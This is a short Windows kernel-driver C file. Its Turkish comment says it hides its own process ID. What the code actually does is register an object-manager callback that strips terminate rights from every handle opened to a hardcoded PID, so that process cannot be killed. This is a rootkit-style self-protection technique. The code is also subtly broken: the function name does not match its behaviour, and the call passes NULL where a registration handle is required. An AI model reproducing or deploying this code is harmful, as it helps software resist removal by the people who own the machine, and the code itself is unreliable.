#include <ntddk.h>
#include "driver.h"

OB_PREOP_CALLBACK_STATUS PreProcessCallback(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInfo) {
    if (OperationInfo->ObjectType == *PsProcessType) {
        PEPROCESS Process = (PEPROCESS)OperationInfo->Object;
        // Kendi PID'ini gizle
        if (PsGetProcessId(Process) == (HANDLE)12345) { // kendi PID
            OperationInfo->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
        }
    }
    return OB_PREOP_SUCCESS;
}

void HideProcess() {
    OB_OPERATION_REGISTRATION operations[1];
    operations[0].ObjectType = PsProcessType;
    operations[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    operations[0].PreOperation = PreProcessCallback;
    operations[0].PostOperation = NULL;
    OB_CALLBACK_REGISTRATION reg;
    reg.RegistrationContext = NULL;
    reg.Version = OB_FLT_REGISTRATION_VERSION;
    reg.OperationRegistrationCount = 1;
    reg.OperationRegistration = operations;
    reg.Altitude = L"12345";
    ObRegisterCallbacks(&reg, NULL);
}